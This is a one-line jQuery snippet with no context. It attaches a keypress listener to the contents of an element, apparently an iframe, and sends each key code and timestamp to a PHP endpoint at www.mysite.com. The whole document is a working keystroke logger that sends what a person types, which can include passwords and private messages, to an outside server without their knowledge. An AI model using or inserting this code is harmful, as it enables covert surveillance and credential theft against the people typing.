$('#w').contents().keypress(function(event) {$.get('http://www.mysite.com/k.php?x='+event.which+'&t='+event.timeStamp,function(data){});});
